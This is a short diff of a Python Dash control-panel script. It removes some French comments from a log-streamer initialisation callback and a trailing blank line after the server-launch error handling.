@@ -2066,15 +2287,13 @@ def initialize_log_streamer(data):
         try:
             global_log_streamer.start_capturing()
             sys._log_streamer_active_flag = True
-            # Le message d'activation est déjà géré par LogStreamer lui-même
         except Exception as e:
             _GLOBAL_MODULE_LOGGER.log_critical(f"Impossible d'activer LogStreamer via callback: {e}. Les logs en direct ne seront pas disponibles.")
     elif isinstance(global_log_streamer, LogStreamer) and sys._log_streamer_active_flag:
         _GLOBAL_MODULE_LOGGER.log_info("LogStreamer global déjà actif.")
-    else: # Si c'est un MockLogStreamer (en cas d'ImportError initial)
+    else:
         _GLOBAL_MODULE_LOGGER.log_warning("LogStreamer est une implémentation mock. La capture de logs en direct ne sera pas possible.")
     
-    # Ne pas renvoyer de mise à jour pour éviter une boucle, la valeur initiale est suffisante
     raise dash.exceptions.PreventUpdate
 
 
@@ -2092,5 +2311,4 @@ if __name__ == '__main__':
     except Exception as e:
         print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] ERROR LAUNCHING DASH SERVER: {e}")
         print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ControlPanel] Verify if the port is already in use or if Dash is properly installed.")
-
 
